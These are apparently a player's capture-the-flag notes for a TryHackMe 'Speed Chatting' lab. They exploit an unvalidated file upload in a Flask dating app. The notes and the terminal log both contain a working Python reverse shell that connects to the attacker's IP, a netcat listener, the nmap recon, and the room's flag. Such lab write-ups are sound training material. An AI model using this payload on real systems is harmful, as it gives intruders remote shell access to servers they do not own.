@@ -1,0 +1,130 @@
+Speed Chatting — Lab Notes
+Room: Speed Chatting · Event: Love at First Breach 2026 · Date: 2026-09-17
+
+1. Recon
+ping 10.49.152.1
+nmap -p- --min-rate=1000 -T4 10.49.152.1
+
+Port	Service	Notes
+22	SSH	OpenSSH 8.9p1
+5000	HTTP	Werkzeug / Flask (Python 3.10)
+
+2. Identify Vulnerability
+App: LoveConnect (messaging/dating app)
+Feature: Profile picture upload with no validation
+Backend: Python/Flask → PHP shells won't work
+Payload language must match backend → Python reverse shell
+3. Setup
+# Confirm tun0 IP
+ip addr | grep tun0
+# → 192.168.146.39
+
+# Verify tun0 is alive
+ping 192.168.146.39
+
+Reverse shell payload (rev.py):
+
+import os, socket, subprocess
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.146.39", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/bash", "-i"])
+
+Listener:
+
+rlwrap nc -lvnp 4444
+
+4. Exploit
+Upload rev.py as profile picture via the app
+View profile → triggers execution
+Connection received from 10.49.152.1:35012
+5. Post-Exploitation
+# Already root
+root@tryhackme-2204:/opt/Speed_Chat# ls
+app.py  flag.txt  uploads
+
+# Grab flag
+root@tryhackme-2204:/opt/Speed_Chat# cat flag.txt
+THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
+
+Key Takeaways
+Match payload to backend (Flask → Python, not PHP)
+No upload validation = RCE if the directory is executable
+App runs as root → no privesc needed
+Working dir: /opt/Speed_Chat/
+
+
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ ping 10.49.152.1
+PING 10.49.152.1 (10.49.152.1) 56(84) bytes of data.
+64 bytes from 10.49.152.1: icmp_seq=1 ttl=62 time=178 ms
+64 bytes from 10.49.152.1: icmp_seq=2 ttl=62 time=200 ms
+^C
+--- 10.49.152.1 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 178.447/189.329/200.211/10.882 ms
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ nmap -p- --min-rate=1000 -T4 10.49.152.1  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 10:17 +0530
+Nmap scan report for 10.49.152.1
+Host is up (0.052s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
+
+ ─(white㉿white)-[~/white/Documents/thm]
+└─$ ip addr | grep tun0
+8: tun0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1380 qdisc noqueue state UP group default qlen 1000
+    inet 192.168.146.39/18 brd 192.168.191.255 scope global tun0
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ ping 192.168.146.39
+PING 192.168.146.39 (192.168.146.39) 56(84) bytes of data.
+64 bytes from 192.168.146.39: icmp_seq=1 ttl=64 time=0.074 ms
+64 bytes from 192.168.146.39: icmp_seq=2 ttl=64 time=0.093 ms
+^C
+--- 192.168.146.39 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1024ms
+rtt min/avg/max/mdev = 0.074/0.083/0.093/0.009 ms
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ nano rev.py    
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ cat rev.py    
+import os, socket, subprocess
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.146.39", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/bash", "-i"])   
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ 
+
+                                                                                                                                                                      
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ rlwrap nc -lvnp 4444   
+listening on [any] 4444 ...
+connect to [192.168.146.39] from (UNKNOWN) [10.49.152.1] 35012
+bash: cannot set terminal process group (415): Inappropriate ioctl for device
+bash: no job control in this shell
+root@tryhackme-2204:/opt/Speed_Chat# ls
+ls
+app.py
+flag.txt
+uploads
+root@tryhackme-2204:/opt/Speed_Chat# cat flag.txt
+cat flag.txt
+THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}root@tryhackme-2204:/opt/Speed_Chat# 
+
